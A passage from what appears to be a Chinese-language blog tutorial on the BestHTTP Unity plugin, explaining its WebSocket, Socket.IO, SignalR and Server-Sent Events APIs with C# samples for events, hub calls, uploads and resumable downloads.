9:AutoDecodePayload属性,\n已经在“接收二进制数据”中讨论过AutoDecodePayload，但是您不仅可以按event设置此值，还可以设置每个socket的值。socket具有AutoDecodePayload属性，该属性用作事件订阅的默认值。其默认值为true - 所有Payload都已解码并分派给事件订阅者。如果设置为false，插件将不进行解码，您必须自己完成。\n你不想每次都抛出args：当然！您可以在Socket对象上设置AutoDecodePayload，并且可以使用您喜欢的Json解析器将Packet的Payload解码为强类型对象。但请记住，Payload将包含事件的名称，它是一个json数组。示例Payload如下所示：&#39;[&#39;eventName&#39;，{&#39;field&#39;：&#39;stringValue&#39;}，{&#39;field&#39;：1.0}]&#39;。\n\n* 10:Error handling  发生服务器端或客户端错误时发出“错误”事件。事件的第一个参数是Error对象。这将包含Code属性中的错误代码和Message属性中的字符串消息。此类中的ToString（）函数已被重写，您可以使用此函数写出其内容。</code></pre><pre><code>    Socket.On(SocketIOEventTypes.Error, OnError); \n    void OnError(Socket socket, Packet packet, params object[] args) \n    { \n            Error error = args[0] as Error; \n            switch (error.Code) \n            { \n                    case SocketIOErrors.User: \n                            Debug.Log(&quot;Exception in an event handler!&quot;); \n                    break; \n                    case SocketIOErrors.Internal: \n                            Debug.Log(&quot;Internal error!&quot;); \n                    break; \n                    default: \n                            Debug.Log(&quot;Server error!&quot;); break; \n            } \n            Debug.Log(error.ToString()); \n    } </code></pre><pre><code>\n* 11:SocketOptions类中的可用选项,您可以将SocketOptions实例传递给SocketManager的构造函数。您可以更改以下选项：\n&gt;&gt;&gt;\n        1):Reconnection：断开连接后是否自动重新连接。其默认值为true\n        2):ReconnectionAttempts：放弃前的尝试次数。它的默认值是Int.MaxValu\n        3):ReconnectionDelay：在尝试重新连接之前最初等待的时间。受+/- RandomizationFactor影响。例如，默认初始延迟将在500ms到1500ms之间。其默认值为10000毫秒。\n        4):ReconnectionDelayMax：重新连接之间等待的最长时间。如上所述，每次尝试都会增加重新连接延迟以及随机化。其默认值为5000毫秒。\n        5):RandomizationFactor：它可用于控制ReconnectionDelay范围。其默认值为0.5，可以在0..1值之间设置\n        6)Timeout:发出“connect_error”和“connect_timeout”事件之前的连接超时。它不是底层tcp套接字的连接超时，而是socket.io协议。其默认值为20000ms\n        7):AutoConnect：通过将此设置为false，您必须在决定适当时调用SocketManager的Open（）。\n        8):ConnectWith：So​​cketManager将尝试连接到此属性的传输集。它可以是TransportTypes.Polling或TransportTypes.WebSocket\n&gt;&gt;&gt;\n\n# SignalR\n* 1:像Socket.IO这样的SignalR实现使用了插件的基本功能。 HTTPRequests和WebSockets用于连接和通信连接池。 Cookie随请求一起发送，记录器用于记录有关协议和错误的信息,SignalR实现的功能简要列表：\n&gt;&gt;&gt;\n        1):兼容最新的SignalR服务器实现\n        2):好用的 API\n        3):传输回调\n        4):重新连接逻辑\n        5):支持所有Hub功能\n&gt;&gt;&gt;</code></pre><pre><code>    using BestHTTP.SignalR;\n    Uri uri = new Uri(&quot;http://besthttpsignalr.azurewebsites.net/raw-connection/&quot;);\n    //通过仅将服务器的uri传递给构造函数来创建没有集线器的连接。\n    Connection signalRConnection = new Connection(uri); \n    //通过将集线器名称传递给构造函数来创建与集线器的连接。\n    Connection signalRConnection = new Connection(uri, &quot;hub1&quot;, &quot;hub2&quot;, &quot;hubN&quot;); \n    //通过将Hub对象传递给构造函数来创建与Hub的连接。\n    Hub hub1 = new Hub(&quot;hub1&quot;); \n    Hub hub2 = new Hub(&quot;hub2&quot;); \n    Hub hubN = new Hub(&quot;hubN&quot;); \n    Connection signalRConnection = new Connection(uri, hub1, hub2, hubN); \n    //创建Connection之后，我们可以通过调用Open（）函数开始连接到服务器\n    signalRConnection.Open(); </code></pre><pre><code>* 2:Handling general events Connection类允许您订阅多个事件。这些事件如下：</code></pre><pre><code>    //OnConnected：当连接类成功连接并且SignalR协议用于通信时，将触发此事件。\n    signalRConnection.OnConnected += (con) =&gt; Debug.Log(&quot;Connected to the SignalR server!&quot;); \n\n    //OnClosed：当SignalR协议关闭时，将触发此事件，并且不再发送或接收更多消息。\n    signalRConnection.OnClosed += (con) =&gt; Debug.Log(&quot;Connection Closed&quot;); \n    //OnError：发生错误时调用。如果连接已打开，插件将尝试重新连接，否则连接将关闭。\n    signalRConnection.OnError += (conn, err) =&gt; Debug.Log(&quot;Error: &quot; + err); \n\n    //OnReconnecting：启动重新连接尝试时会触发此事件。在此事件之后，将调用OnError或OnReconnected事件。可以在OnReconnected / OnClosed事件之前触发多个OnReconnecting-OnError事件对，因为插件将尝试在给定时间内多次重新连接。\n    signalRConnection.OnReconnecting += (con) =&gt; Debug.Log(&quot;Reconnecting&quot;); \n\n    //OnReconnected：重新连接尝试成功时触发。\n    signalRConnection.OnReconnecting += (con) =&gt; Debug.Log(&quot;Reconnected&quot;); \n    //OnStateChnaged：连接状态发生变化时触发。事件处理程序将同时接收旧状态和新状态。\n    signalRConnection.OnStateChanged += (conn, oldState, newState) =&gt; Debug.Log(string.Format(&quot;State Changed {0} -&gt; {1}&quot;, oldState, newState)); \n\n    //OnNonHubMessage：当服务器向客户端发送非集线器消息时触发。客户端应该知道服务器期望的消息类型，并且应该相应地转换接收的对象。\n    signalRConnection.OnNonHubMessage + =（con，data）= Debug.Log（&#39;来自服务器的消息：&#39;+ data.ToString（））;\n\n    //RequestPreparator：为每个发出并将发送到服务器的HTTPRequest调用此委托。它可用于进一步自定义请求。\n    signalRConnection.RequestPreparator = (con, req, type) =&gt; req.Timeout = TimeSpan.FromSeconds(30); </code></pre><pre><code>\n* 3:Sending non-Hub  messages </code></pre><pre><code>    //将非集线器消息发送到服务器很容易，因为调用连接对象上的函数：\n    signalRConnection.Send(new { Type = &quot;Broadcast&quot;, Value = &quot;Hello SignalR World!&quot; }); \n\n    //此函数将使用Connection的JsonEncoder将给定对象编码为Json字符串，并将其发送到服务器。已编码的Json字符串可以使用SendJson函数发送\n    signalRConnection.SendJson(&quot;{ Type: ‘Broadcast’, Value: ‘Hello SignalR World!’ }&quot;); </code></pre><pre><code>\n* 4:Hubs,为了在客户端上定义Hub可以从服务器调用的方法，并调用a上的方法\n服务器上的集线器必须将集线器添加到Connection对象。这可以通过将集线器名称或集线器实例添加到Connection构造函数来完成，在“连接类”部分中进行了演示</code></pre><pre><code>    //可以通过索引或名称通过Connection对象访问Hub实例。\n    Hub hub = signalRConnection[0]; \n    Hub hub = signalRConnection[&quot;hubName&quot;]; \n\n    // 注册服务器可调用方法,要处理服务器可调用方法调用，我们必须调用集线器的On函数：\n    signalRConnection[&quot;hubName&quot;].On(&quot;joined&quot;, Joined); \n    void Joined(Hub hub, MethodCallMessage msg) { Debug.log(string.Format(&quot;{0} joined at {1}&quot;, msg.Arguments[0], msg.Arguments[1])); }</code></pre><pre><code>MethodCallMessage是服务器发送的对象，包含以下属性：\n&gt;&gt;&gt;\n        Hub：包含方法必须调用的集线器名称的字符串。\n        Method：包含方法名称的字符串\n        Arguments：包含方法调用参数的对象数组。它可以是一个空数组。\n        State：包含其他自定义数据的字典\n&gt;&gt;&gt;\n该插件将使用Hub和Method属性将消息路由到正确的集线器和事件处理程序。处理方法调用的函数只能使用Arguments和State属性。\n\n* 5:Call server-side methods \n调用服务器端方法可以通过调用Hub的Call函数来完成。调用函数重载以满足每个需求。 Call函数是非阻塞函数，它们不会阻塞，直到服务器发回有关该调用的任何消息。\n* 6:重载函数:\nCall（string method，params object [] args）：这可以用来以一种即发即弃的方式调用服务器端函数。我们不会收到有关方法调用成功或失败的任何消息。可以在没有任何&#39;args&#39;参数的情况下调用此函数来调用无参数方法</code></pre><pre><code>    //在没有任何参数的情况下调用服务器端函数\n    signalRConnection[&quot;hubName&quot;].Call(&quot;Ping&quot;); \n    //使用两个字符串参数调用服务器端函数：&#39;param1&#39;和&#39;param2&#39;\n    signalRConnection[&quot;hubName&quot;].Call(&quot;Message&quot;, &quot;param1&quot;, &quot;param2&quot;); </code></pre><pre><code>Call（string method ，OnMethodResultDelegate onResult，params object [] args）：此函数可以用作前一个函数，但是函数可以作为第二个参数传递，该参数将在成功调用服务器端函数时调用。</code></pre><pre><code>    signalRConnection[&quot;hubName&quot;].Call(&quot;GetValue&quot;, OnGetValueDone); \n    void OnGetValueDone(Hub hub, ClientMessage originalMessage, ResultMessage result) { Debug.Log(&quot;GetValue executed on the server. Return value of the function:&quot; + result.ReturnValue.ToString()); } </code></pre><pre><code>此回调函数接收调用此函数的Hub，发送到服务器的原始ClientMessage消息以及由于方法调用而由服务器发送的ResultMessage实例。 ResultMessage对象包含ReturnValue和State属性。               \n如果方法的返回类型为void，则ReturnValue为null.\nCall（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，params object [] args）：此函数可用于指定当方法无法在服务器上运行时将调用的回调。由于方法调用中存在未找到的方法，错误的参数或未处理的异常，因此可能会发生故障</code></pre><pre><code>    signalRConnection[&quot;hubName&quot;].Call(&quot;GetValue&quot;, OnGetValueDone, OnGetValueFailed); \n    void OnGetValueFailed(Hub hub, ClientMessage originalMessage, FailureMessage error) \n    { \n            Debug.Log(&quot;GetValue failed. Error message from the server: &quot; + error.ErrorMessage); \n    } </code></pre><pre><code> FailureMessage包含以下属性：\n &gt;&gt;&gt;\n        ○ IsHubError：如果是Hub错误，则为True。 \n        ○ ErrorMessage：有关错误本身的简短消息。 \n        ○ StackTrace：如果在服务器上打开了详细的错误报告，则它包含错误的堆栈跟踪。\n        ○ AdditionalData：如果它不为null，则它包含有关错误的其他信息。\n &gt;&gt;&gt;\n Call（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，OnMethodProgressDelegate onProgress，params object [] args）：此函数可用于向服务器端方法调用添加其他进度消息处理程序。对于长时间运行的作业，服务器可以将进度消息发送到客户端。</code></pre><pre><code>    signalRConnection[&quot;hubName&quot;].Call(&quot;GetValue&quot;, OnGetValueDone, OnGetValueFailed, OnGetValueProgress); \n    void OnGetValueProgress(Hub hub, ClientMessage originalMessage, ProgressMessage progress) \n    { \n            Debug.Log(string.Format(&quot;GetValue progressed: {0}%&quot;, progress.Progress)); \n    }</code></pre><pre><code> 当插件收到ResultMessage或FailureMessage时，它不会为这些消息之后的ProgressMessages提供服务。\n\n * 7:使用Hub类作为继承的基类,Hub类可以用作封装集线器功能的基类。</code></pre><pre><code>    class SampleHub : Hub \n    { \n            // 默认构造函数。每个集线器都必须有一个有效的名称. \n            public SampleHub() :base(&quot;SampleHub&quot;) \n            { \n                    // 注册服务器可调用函数 \n                    base.On(&quot;ClientFunction&quot;, ClientFunctionImplementation); \n            }\n            // 私有函数实现服务器可调用函数\n            private void ClientFunctionImplementation(Hub hub, MethodCallMessage msg) \n            { \n            // TODO: implement \n            } \n            // 包装函数调用服务器端函数.\n            public void ServerFunction(string argument) \n            { \n                    base.Call(&quot;ServerFunction&quot;, argument); \n            } \n    }\n    //可以实例化此SampleHub并将其传递给Connection的构造函数：\n    SampleHub sampleHub = new SampleHub(); Connection signalRConnection = new Connection(Uri, sampleHub); </code></pre><pre><code>\n * 8:Authentication\n Connection类具有AuthenticationProvider属性，可以将其设置为实现IAuthenticationProvider接口的对象,实现者必须实现以下属性和功能\n &gt;&gt;&gt;\n        ● bool IsPreAuthRequired：如果在Connection类向服务器发出任何请求之前必须运行身份验证，则返回true的属性。示例：cookie身份验证器必须返回false，因为它必须发送用户凭据并接收必须随请求一起发送的cookie。 \n        ● StartAuthentication：仅在IsPreAuthRequired为true时才需要的函数。否则它不会被调用。 \n        ● PrepareRequest：使用请求和请求类型枚举调用的函数。此函数可用于在将请求发送到服务器之前准备。 \n        ● OnAuthenticationSucceded：IsPreAuthRequired为true且身份验证过程成功时必须调用的事件。 \n        ● OnAuthenticationFailed：IsPreAuthRequired为true且身份验证过程失败时必须调用的事件。\n &gt;&gt;&gt;\n 一个非常简单的基于Header的身份验证器看起来像这样：</code></pre><pre><code>    class HeaderAuthenticator : IAuthenticationProvider \n    { \n            public string User { get; private set; } \n            public string Roles { get; private set; } \n            // 此类身份验证不需要预先验证步骤\n            public bool IsPreAuthRequired { get { return false; } } \n            //未使用的事件，因为IsPreAuthRequired为false \n            public event OnAuthenticationSuccededDelegate OnAuthenticationSucceded; \n            //未使用的事件，因为IsPreAuthRequired为false\n            public event OnAuthenticationFailedDelegate OnAuthenticationFailed; \n            // 使用用户名和角色初始化身份验证器的构造函数.\n            public HeaderAuthenticator(string  user, string roles) \n            { \n                    this.User = user; this.Roles = roles; \n            } \n            //未使用的事件，因为IsPreAuthRequired为false             \n            public void StartAuthentication() { } \n            // 通过向其添加两个标头来准备请求\n            public void PrepareRequest(BestHTTP.HTTPRequest request, RequestTypes type) \n            { \n                    request.SetHeader(&quot;username&quot;, this.User); request.SetHeader(&quot;roles&quot;, this.Roles); \n            }\n    }</code></pre><pre><code> 与Socket.IO的Manager类一样，SignalR的Connection类具有JsonEncoder属性，也可以设置静态Connection.DefaultEncoder。 JsonEncoder必须从BestHTTP.SignalR.JsonEncoders命名空间实现IJsonEncoder接口。该软件包包含一个LitJsonEncoder示例，也可用于某些示例\n\n ## Server-Sent Events\n\n* 1:Server-Sent Events是一种基于字符串的单向协议。数据来自服务器，没有选项可以向服务器发送任何内容。它是使用最新的草案实现的。虽然协议的名称是Server-Sent Events，但类本身名为EventSource,发生错误时，一旦发送LastEventId，插件将尝试重新连接，让服务器发送任何我们应该收到的缓冲消息</code></pre><pre><code>    //The EventSource class \n    //EventSource类位于BestHTTP.ServerSentEvents命名空间中：\n    using BestHTTP.ServerSentEvents; \n    var sse = new EventSource(new Uri(&quot;http://server.com&quot;)); </code></pre><pre><code>* 2:Properties,这些是EventSource类的公开公开属性：\n&gt;&gt;&gt;\n        ● Uri：这是协议尝试连接的端点。它是通过构造函数设置的。 \n        ● State：EventSource对象的当前状态。 \n        ● ReconnectionTime：等待尝试重新连接尝试的时间。它的默认值是2秒。 \n        ● LastEventId：最后收到的事件的id。如果没有收到任何事件ID，它将为null。 \n        ● InternalRequest：将在Open函数中发送的内部HTTPRequest对象。\n&gt;&gt;&gt;\n\n* 3:事件</code></pre><pre><code>    //OnOpen：成功升级协议时调用它\n    eventSource.OnOpen += OnEventSourceOpened; \n    void OnEventSourceOpened(EventSource source) { Debug.log(&quot;EventSource Opened!&quot;); } \n\n    //OnMessage：当客户端从服务器收到新消息时调用它。此函数将接收一个Message对象，该对象包含Data属性中消息的有效内容。每次客户端收到消息时都会调用此事件，即使消息具有有效的事件名称，我们也为此事件分配了一个事件处理程序！\n    eventSource.OnMessage += OnEventSourceMessage;\n    void OnEventSourceMessage(EventSource source, Message msg) { Debug.log(&quot;Message: &quot; + msg.Data); }\n\n    // OnError：在连接到服务器或处理数据流时遇到错误时调用\n    eventSource.OnError += OnEventSourceError; \n    void OnEventSourceError(EventSource source, string error) { Debug.log(&quot;Error: &quot; + error); }\n\n    //OnRetry：在插件尝试重新连接到服务器之前调用此函数。如果函数返回false，则不会进行任何尝试，并且将关闭EventSource。\n    eventSource.OnRetry += OnEventSourceRetry; \n    bool OnEventSourceRetry(EventSource source) { // disable retry return false; }\n\n    //OnClosed：当EventSource关闭时，将调用此事件。\n    eventSource.OnClosed += OnEventSourceClosed; \n    void OnEventSourceClosed(EventSource source) { Debug.log(&quot;EventSource Closed!&quot;); } \n\n    //OnStateChanged：每次State属性更改时调用。\n    eventSource.OnStateChanged += OnEventSourceStateChanged; \n    void OnEventSourceStateChanged(EventSource source, States oldState, States newState) { Debug.log(string.Format(&quot;State Changed {0} =&gt; {1}&quot;, oldSate, newState))); }</code></pre><pre><code>\n* 4:Functions,这些是EventSource对象的公共函数。</code></pre><pre><code>    //Open: 调用此函数，插件将开始连接到服务器并升级到Server-Sent Events协议。\n    EventSource eventSource = new EventSource(new Uri(&quot;http://server.com&quot;)); \n    eventSource.Open(); \n\n    // On:使用此功能，客户端可以订阅事件\n    eventSource.On(&quot;userLogon&quot;, OnUserLoggedIn); \n    void OnUserLoggedIn(EventSource source, Message msg) { Debug.log(msg.Data); }\n\n    //Off:它可用于取消订阅活动。\n    eventSource.Off(&quot;userLogon&quot;); \n\n    //Close: 此函数将开始关闭EventSource对象。\n    eventSource.Close(); </code></pre><pre><code>* 5:Message,Message类是一个逻辑单元，包含服务器可以发送的所有信息,Properties:\n&gt;&gt;&gt;\n     ● Id：已发送事件的ID。如果没有发送id，则可以为null。它被插件使用。 \n     ● 事件：事件的名称。如果没有发送事件名称，则可以为null。 \n     ● 数据：消息的实际有效负载。 \n     ● 重试：服务器发送插件在重新连接尝试之前应等待的时间。它被插件使用。\n&gt;&gt;&gt;\n\n## 简单例子\n● Upload a picture using forms </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://server.com&quot;), HTTPMethods.Post, onFinished); \n    request.AddBinaryData(&quot;image&quot;, texture.EncodeToPNG(), &quot;image.png&quot;); \n    request.Send(); </code></pre><pre><code>● Upload a picture without forms, sending only the raw data </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://server.com&quot;), HTTPMethods.Post, onFinished); \n    request.SetHeader(&quot;Content-Type&quot;, &quot;image/png&quot;); \n    request.Raw = texture.EncodeToPNG(); \n    request.Send(); </code></pre><pre><code>● Add custom header </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://server.com&quot;), HTTPMethods.Post, onFinished); \n    request.SetHeader(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;); \n    request.RawData = UTF8Encoding.GetBytes(ToJson(data)); \n    request.Send(); </code></pre><pre><code>● Display  download progress </code></pre><pre><code>    var request = new HTTPRequest(new Uri(&quot;http://serveroflargefile.net/path&quot;), (req, resp) =&gt; { Debug.Log(&quot;Finished!&quot;); }); \n    request.OnProgress += (req, down, length) =&gt; Debug.Log(string.Format(&quot;Progress: {0:P2}&quot;, down / (float)length)); \n    request.Send(); </code></pre><pre><code>● Abort a request </code></pre><pre><code>    var request = new HTTPRequest(new Uri(address), (req, resp) =&gt; { // State should be HTTPRequestStates.Aborted if we call Abort() before // it’s finishes Debug.Log(req.State); }); \n    request.Send(); \n    request.Abort();</code></pre><pre><code>● 可恢复下载的范围请求,第一个请求是获取服务器功能的Head请求。当支持范围请求时，将调用DownloadCallback函数。在这个函数中，我们将创建一个新的实际请求来获取内容的块，并将回调函数设置为此函数。当前下载位置保存到PlayerPrefs，因此即使在应用程序重新启动后也可以恢复下载。</code></pre><pre><code>    private const int ChunkSize = 1024 * 1024; // 1 MiB - should be bigger! \n    private string saveTo = &quot;downloaded.bin&quot;; \n    void StartDownload(string url) \n    {\n    var headRequest = new HTTPRequest(new Uri(url), HTTPMethods.Head, (request, response) =&gt; \n    {\n            if (response == null) Debug.LogError(&quot;Response null. Server unreachable? Try again later.&quot;); \n            else {\n                    if (response.StatusCode == 416) Debug.LogError(&quot;Requested range not satisfiable&quot;); else if (response.StatusCode == 200) \n                    Debug.LogError(&quot;Partial content doesn&#39;t supported by the server, content can be downloaded as a whole.&quot;); \n                    else if (response.HasHeaderWithValue(&quot;accept-ranges&quot;,&quot;none&quot;)) Debug.LogError(&quot;Server doesn&#39;t supports the &#39;Range&#39; header! The file can&#39;t be downloaded in parts.&quot;); \n                    else DownloadCallback(request, response);         \n            }\n    }  \n    // Range header for our head request \n    int startPos = PlayerPrefs.GetInt(&quot;LastDownloadPosition&quot;,0); \n    headRequest.SetRangeHeader(startPos, startPos + ChunkSize); \n    headRequest.DisableCache = true; headRequest.Send(); \n    } \n\n    void DownloadCallback(HTTPRequest request, HTTPResponse response) \n    {\n            if (response == null) { Debug.LogError(&quot;Response null. Server unreachable, or connection lost? Try again later.&quot;); return; } var range = response.GetRange(); \n            if (range == null) { Debug.LogError(&quot;No &#39;Content-Range&#39; header returned from the server!&quot;); return; } \n            else if (!range.IsValid) { Debug.LogError(&quot;No valid &#39;Content-Range&#39; header returned from the server!&quot;); return; } \n            if (request.MethodType != HTTPMethods.Head) \n            { \n                    string path = Path.Combine(Application.temporaryCachePath,saveTo); \n                    using (FileStream fs = new FileStream(path, FileMode.Append)) fs.Write(response.Data, 0, response.Data.Length); \n                    PlayerPrefs.SetInt(&quot;LastDownloadPosition&quot;, range.LastBytePos); \n                    Debug.LogWarning(string.Format(&quot;Download Status: {0}-{1}/{2}&quot;, range.FirstBytePos, range.LastBytePos, range.ContentLength)); \n                    if (range.LastBytePos == range.ContentLength - 1) { Debug.LogWarning(&quot;Download finished!&quot;); return; } \n            }\n            var downloadRequest = new HTTPRequest(request.Uri, HTTPMethods.Get, /*isKeepAlive:*/ true, DownloadCallback); \n            int nextPos = 0; \n            if (request.MethodType != HTTPMethods.Head) nextPos = range.LastBytePos + 1; else nextPos = PlayerPrefs.GetInt(&quot;LastDownloadPosition&quot;, 0);\n            downloadRequest.SetRangeHeader(nextPos, nextPos + ChunkSize); \n            downloadRequest.DisableCache = true;    \n            downloadRequest.Send(); \n    } </code></pre><pre><code>\n## 其他\n\n* 1:禁用功能\n&gt;&gt;&gt;\n        ●BESTHTTP_DISABLE_COOKIES：使用此定义可以禁用所有与cookie相关的代码。不会进行cookie解析，保存和发送。 \n        ●BESTHTTP_DISABLE_CACHING：使用此定义可以禁用所有与缓存相关的代码。不会进行缓存或缓存验证。 \n        ●BESTHTTP_DISABLE_SERVERSENT_EVENTS：可以使用此功能禁用服务器发送的事件。 SignalR不会回退到此。 \n        ●BESTHTTP_DISABLE_WEBSOCKET：可以使用此禁用Websocket。 SignalR和Socket.IO不会使用此协议。 \n        ●BESTHTTP_DISABLE_SIGNALR：将禁用整个SignalR实施。 \n        ●BESTHTTP_DISABLE_SIGNALR_CORE：将禁用SignalR Core实施。 \n        ●BESTHTTP_DISABLE_SOCKETIO：将禁用整个Socket.IO实现。 \n        ●BESTHTTP_DISABLE_ALTERNATE_SSL：如果您没有为WebSocket使用HTTPS或WSS，或者您对默认实现感到满意，则可以禁用备用ssl处理程序。 \n        ●BESTHTTP_DISABLE_UNITY_FORM：您可以删除对Unity的WWWForm的依赖。\n&gt;&gt;&gt;\n* 2:支持的平台\n&gt;&gt;&gt;\n        ● WebGL\n        ● iOS\n        ● Android\n        ● Windows Phone 10\n        ● WinRT / Metro / Windows应用商店应用8.1,10•Windows，Linux和Mac独立版\n&gt;&gt;&gt;\n* 3:在Android，iOS和桌面平台上.net的Net SslStream用于HTTPS。这可以处理各种证书，但有些证书可能会失败。要提供备用解决方案BouncyCastle捆绑在插件中，您可以通过在HTTPRequest对象上将UseAlternateSSL设置为true来使用它。但它也可能在一些认证上失败。在Windows Phone 8.1（及更高版本）和WinRT（Windows应用商店应用程序）上，安全的Tls 1.2协议将处理连接。\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"WebSocket\"><a href=\"#WebSocket\" class=\"headerlink\" title=\"WebSocket\"></a>WebSocket</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><ul>\n<li><p>1:我们可以通过WebSocket类使用WebSocket功能。我们只需要将服务器的Uri传递给WebSocket的构造函数</p>\n</li>\n<li><p>2:创建</p>\n</li>\n</ul>\n<pre><code>        var webSocket = new WebSocket(new Uri(&quot;wss://html5labs-interop.cloudapp.net/echo&quot;)); \n</code></pre><ul>\n<li>3:,OnOpen事件：在建立与服务器的连接时调用。在此事件回调之后，WebSocket的IsOpen属性将为True，直到我们或服务器关闭连接或发生错误。</li>\n</ul>\n<pre><code>        webSocket.OnOpen += OnWebSocketOpen; \n        private void OnWebSocketOpen(WebSocket webSocket) { Debug.Log(&quot;WebSocket Open!&quot;); }</code></pre><ul>\n<li>4:,OnMessage事件：从服务器收到文本消息时调用。</li>\n</ul>\n<pre><code>        webSocket.OnMessage += OnMessageReceived; \n        private void OnMessageReceived(WebSocket webSocket, string message) { Debug.Log(&quot;Text Message received from server: &quot; + message); } \n</code></pre><ul>\n<li>5:,OnBinary事件：从服务器收到二进制blob消息时调用。</li>\n</ul>\n<pre><code>        webSocket.OnBinary += OnBinaryMessageReceived; \n        private void OnBinaryMessageReceived(WebSocket webSocket, byte[] message) { Debug.Log(&quot;Binary Message received from server. Length: &quot; + message.Length); }\n</code></pre><ul>\n<li>6:,OnClosed事件：在客户端或服务器关闭连接时调用，或发生内部错误。当客户端通过Close函数关闭连接时，它可以提供代码和消息，指示关闭的原因。服务器通常会回复我们的代码和消息。</li>\n</ul>\n<pre><code>        webSocket.OnClosed += OnWebSocketClosed; \n        private void OnWebSocketClosed(WebSocket webSocket, UInt16 code, string message) { Debug.Log(&quot;WebSocket Closed!&quot;);}\n</code></pre><ul>\n<li>7:OnError事件：当我们无法连接到服务器时调用，发生内部错误或连接丢失。第二个参数是Exception对象，但它可以为null。在这种情况下，检查WebSocket的InternalRequest应该告诉更多有关该问题的信息。</li>\n</ul>\n<pre><code>        webSocket.OnError += OnError; \n        private void OnError(WebSocket ws, Exception ex) \n        { \n                string errorMsg = string .Empty; \n                if (ws.InternalRequest.Response != null)\n                {\n                        errorMsg = string.Format(&quot;Status Code from Server: {0} and Message: {1}&quot;, ws.InternalRequest.Response.StatusCode, ws.InternalRequest.Response.Message); \n                }\n                Debug.Log(&quot;An error occured: &quot; + (ex != null ? ex.Message : &quot;Unknown: &quot; + errorMsg)); \n        } \n</code></pre><ul>\n<li>8:OnErrorDesc事件：一个更具信息性的事件，此事件在OnError事件之后调用,因为后者仅使用Exception参数调用。但它可以提供更详细的错误报告。</li>\n</ul>\n<pre><code>        webSocket.OnErrorDesc += OnErrorDesc; \n        void OnErrorDesc(WebSocket ws, string error) { Debug.Log(&quot;Error: &quot; + error); } \n</code></pre><ul>\n<li>9:在我们将所有事件注册完备之后，我们可以开始连接：</li>\n</ul>\n<pre><code>        webSocket.Open(); \n</code></pre><p>在此步骤之后，我们将收到一个OnOpen事件的回调，我们可以开始向服务器发送消息。</p>\n<pre><code>        // 发送字符串: \n        webSocket.Send(&quot;Message to the Server&quot;); \n\n        // 创建二进制流,并填充: \n        byte[] buffer = new byte[length]; \n        //发送二进制流 \n        webSocket.Send(buffer); \n</code></pre><p>完成通信后/不需要的时候,关闭链接,无法重用已关闭的WebSocket实例。</p>\n<pre><code>        webSocket.Close(); \n</code></pre><ul>\n<li>10:Ping消息：通过在收到OnOpen事件之前将StartPingThread属性设置为True，可以启动新线程将Ping消息发送到服务器。这样，Ping消息将定期发送到服务器。可以在PingFrequency属性中设置两次ping之间的延迟（默认值为1000ms）.(相当于设置心跳包)</li>\n<li>11:Pong消息：从插件服务器收到的所有ping消息将自动生成Pong应答。</li>\n<li>12:Streaming：较长的文本或二进制消息将变得支离破碎。默认情况下，这些片段由插件自动组装。如果我们向WebSocket的OnIncompleteFrame事件注册事件处理程序，则可以覆盖此机制。每次客户端收到不完整的片段时都会调用此事件。这些片段将被插件忽略，它不会尝试组装这些片段，也不会存储它们。此事件可用于实现流式传输体验。(自定义组装消息).</li>\n</ul>\n<h2 id=\"使用Socket-IO\"><a href=\"#使用Socket-IO\" class=\"headerlink\" title=\"使用Socket.IO\"></a>使用Socket.IO</h2><ul>\n<li>1:Socket.IO实现使用插件已有的功能。当轮询传输与其所有功能（cookie，连接重用等）一起使用时，它将发送HTTPRequests以获取握手数据，发送和接收数据包。 WebSocket实现用于WebSocket传输<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>  1):易于使用和熟悉的api\n  2):兼容最新的Socket.IO规范\n  3):从轮询传输到websocket传输的无缝升级\n  4):断开时自动重新连接\n  5):简单高效的二进制数据发送和多种接收方式\n  6):在高级模式下使用它的强大工具（切换默认编码器，禁用自动解码等）</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>2:使用.如果要连接到Socket.IO服务，可以使用BestHTTP.SocketIO.SocketManager类来完成。首先，您必须创建一个SocketManager实例</li>\n</ul>\n<pre><code>        using System; using BestHTTP; \n        using BestHTTP.SocketIO; \n        var manager = new SocketManager(new Uri(&quot;http://chat.socket.io/socket.io/&quot;)); </code></pre><ul>\n<li>3:Url中的/socket.io/路径非常重要，默认情况下，Socket.IO服务器将侦听此查询。所以不要忘记测试！</li>\n<li>4:Connecting to namespaces ,默认情况下，SocketManager将在连接到服务器时连接到根（“/”）命名空间。您可以通过SocketManager的Socket属性访问它：</li>\n</ul>\n<pre><code>        Socket root = manager.Socket; </code></pre><p>可以通过GetSocket（’/ nspName’）函数或通过manager的indexer属性访问非默认名称空间：</p>\n<pre><code>        Socket nsp = manager[&quot;/customNamespace&quot;]; \n        // 等价于: \n        Socket nsp = manager.GetSocket(&quot;/customNamespace&quot;); </code></pre><p>首次访问命名空间将启动内部连接过程</p>\n<ul>\n<li><p>4:Subscribing  and receiving events ,您可以订阅预定义和自定义事件。预定义事件是“连接”，“连接”，“事件”，“断开连接”，“重新连接”，“重新连接”，“重新连接”，“重新连接失败”，“错误”。(“connect”, “connecting”, “event”, “disconnect”, “reconnect”, “reconnecting”, “reconnect_attempt”, “reconnect_failed”, “error”. )自定义事件是程序员定义的事件，服务器将发送给您的客户端。您可以通过调用套接字的On函数来订阅事件：</p>\n<pre><code>      manager.Socket.On(&quot;login&quot;, OnLogin); \n      manager.Socket.On(&quot;new message&quot;, OnNewMessage); \n\n      void OnLogin(Socket socket, Packet packet, params object[] args) \n      { \n              //Socket参数将是服务器发送此事件的namespace-socket对象\n              //Packet参数包含事件的内部分组数据。数据包可用于访问服务器发送的二进制数据，或使用自定义Json解析器lib解码有效负载数据。稍后会详细介绍。\n              //Args参数是一个可变长度数组，包含来自数据包有效负载数据的解码对象。使用默认的Json编码器，这些参数可以是“原始”类型（int，double，string）或对象列表（List对象）或Dictionary字符串，对象对象。\n      } \n</code></pre></li>\n</ul>\n<pre><code></code></pre><pre><code>    //服务器上面的代码写法,在一个 node.js 的服务器上面\n    socket.emit(&#39;message&#39;, 